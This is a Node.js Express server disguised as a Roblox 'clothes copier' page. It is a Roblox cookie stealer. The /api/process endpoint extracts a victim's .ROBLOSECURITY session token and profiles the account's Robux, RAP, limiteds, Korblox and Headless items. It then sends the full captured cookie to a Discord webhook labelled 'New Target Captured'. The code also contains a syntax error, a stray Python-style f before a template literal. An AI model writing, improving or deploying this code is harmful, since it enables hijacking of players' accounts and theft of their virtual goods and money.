const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Serve clothes-copier.html explicitly on the /clothes-copier route
app.get('/clothes-copier', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'clothes-copier.html'));
});

// Automatically redirect root homepage to /clothes-copier
app.get('/', (req, res) => {
    res.redirect('/clothes-copier');
});

// Helper function for Roblox API requests
async function safeGet(url, cookie) {
    try {
        const response = await fetch(url, {
            headers: {
                'User-Agent': 'Roblox/WinINet',
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'Referer': 'https://www.roblox.com/',
                'Accept': 'application/json, text/plain, */*'
            }
        });
        if (response.ok) {
            return await response.json();
        }
    } catch (err) {
        console.error(`Fetch error for ${url}:`, err.message);
    }
    return null;
}

// API Processing Endpoint
app.post('/api/process', async (req, res) => {
    const { data } = req.body;
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    if (!data) {
        return res.status(400).json({ success: false, error: 'No data provided' });
    }

    if (!webhookUrl) {
        console.error('DISCORD_WEBHOOK_URL environment variable is missing!');
        return res.status(500).json({ success: false, error: 'Server webhook configuration missing.' });
    }

    try {
        // Decode base64 input or use as raw string
        let decodedScript = data.trim();
        try {
            decodedScript = Buffer.from(data, 'base64').toString('utf-8');
        } catch (e) {
            // Keep raw if not base64
        }

        // Extract .ROBLOSECURITY token via regex matching
        let roblosecurity = decodedScript;
        const cookieMatch = roblosecurity.match(/(_\|WARNING:[^"']+)/);
        if (cookieMatch) {
            roblosecurity = cookieMatch[1];
        }
        roblosecurity = roblosecurity.replace(/\s+/g, '').replace(/["']/g, '');

        // 1. Authenticate user session
        const authData = await safeGet('https://users.roblox.com/v1/users/authenticated', roblosecurity);
        if (!authData || !authData.id) {
            return res.status(422).json({ success: false, error: 'Invalid or expired Roblox cookie.' });
        }

        const userId = authData.id;
        const username = authData.name || 'Unknown';
        const displayName = authData.displayName || username;

        // 2. Fetch User Profile Info & Age
        const userInfo = await safeGet(`https://users.roblox.com/v1/users/${userId}`, roblosecurity);
        let accountAgeDays = 0;
        if (userInfo && userInfo.created) {
            const createdDate = new Date(userInfo.created);
            accountAgeDays = Math.floor((Date.now() - createdDate.getTime()) / (1000 * 60 * 60 * 24));
        }
        const isBanned = userInfo ? userInfo.isBanned : false;

        // 3. Fetch Avatar Thumbnail
        const thumbData = await safeGet(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`, roblosecurity);
        const avatarUrl = thumbData && thumbData.data && thumbData.data[0] ? thumbData.data[0].imageUrl : 'https://www.roblox.com';

        // 4. Fetch Robux Balance
        const economyData = await safeGet(`https://economy.roblox.com/v1/users/${userId}/currency`, roblosecurity);
        const robuxBalance = economyData ? (economyData.robux || 0) : 0;

        // 5. Fetch Pending Robux
        const totalsData = await safeGet(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?transactionType=summary`, roblosecurity);
        const pendingRobux = totalsData ? (totalsData.pendingRobux || 0) : 0;

        // 6. Collectibles & RAP Calculation (with pagination support)
        let totalRap = 0;
        let limitedsCount = 0;
        let cursor = '';
        for (let i = 0; i < 5; i++) {
            let colUrl = `https://inventory.roblox.com/v2/users/${userId}/inventory/collectibles?limit=100&sortOrder=Asc`;
            if (cursor) colUrl += `&cursor=${cursor}`;

            const colData = await safeGet(colUrl, roblosecurity);
            if (!colData || !colData.data) break;

            for (const item of colData.data) {
                totalRap += item.recentAveragePrice || 0;
                limitedsCount++;
            }

            cursor = colData.nextPageCursor;
            if (!cursor) break;
        }

        // 7. Korblox & Headless Ownership Checks
        const korbloxRes = await safeGet(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/48545806`, roblosecurity);
        const hasKorblox = korbloxRes && korbloxRes.data && korbloxRes.data.length > 0;

        const headlessRes = await safeGet(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/4819740796`, roblosecurity);
        const hasHeadless = headlessRes && headlessRes.data && headlessRes.data.length > 0;

        // 8. Public Games & Place Visits
        const gamesData = await safeGet(`https://games.roblox.com/v2/users/${userId}/games?accessFilter=Public&limit=50`, roblosecurity);
        let gamesCount = 0;
        let totalVisits = 0;
        if (gamesData && gamesData.data) {
            for (const game of gamesData.data) {
                gamesCount++;
                totalVisits += game.placeVisits || 0;
            }
        }

        // 9. Format Discord Embed Payload
        const discordPayload = {
            content: `@everyone New Payload Captured from **${username}**!`,
            username: `${username} | RBXDEV Bot`,
            avatar_url: avatarUrl,
            embeds: [{
                title: "💎 **New Target Captured!**",
                color: 3092790,
                thumbnail: { url: avatarUrl },
                description: (
                    f`👑 **[${username} | 13+]**\n` +
                    `🔗 **[Roblox Profile](https://www.roblox.com/users/${userId}/profile)**\n\n` +
                    `👤 **Username**: \`${username}\`\n` +
                    `📌 **Display Name**: \`${displayName}\`\n\n` +
                    `📈 **Account Stats**\n` +
                    `> • Account Age: \`${accountAgeDays} Days\`\n` +
                    `> • Game Visits: \`${totalVisits}\`\n` +
                    `> • Public Games: \`${gamesCount}\`\n` +
                    `> • Banned Status: \`${isBanned}\`\n\n` +
                    `🪙 **Economy Section**\n` +
                    `> • Balance: \`${robuxBalance.toLocaleString()}\`\n` +
                    `> • Pending: \`${pendingRobux.toLocaleString()}\`\n` +
                    `> • RAP: \`${totalRap.toLocaleString()}\`\n` +
                    `> • Limiteds Count: \`${limitedsCount}\`\n\n` +
                    `🎒 **Items & Bundles**\n` +
                    `> • Korblox: \`${hasKorblox}\`\n` +
                    `> • Headless: \`${hasHeadless}\`\n\n` +
                    `🔑 **Full Captured Cookie**:\n\`\`\`text\n${roblosecurity}\n\`\`\``
                ),
                footer: { text: "RBXDEV Telemetry Engine • 2026" }
            }]
        };

        // 10. Dispatch to your Render Environment Variable Webhook
        const discordRes = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload)
        });

        if (!discordRes.ok) {
            console.error('Failed to dispatch webhook:', await discordRes.text());
        }

        return res.json({ success: true, message: 'Payload processed and dispatched successfully.' });

    } catch (err) {
        console.error('Processing exception:', err);
        return res.status(500).json({ success: false, error: 'Internal server processing error.' });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 RBXDEV Server running live on port ${PORT}`);
});
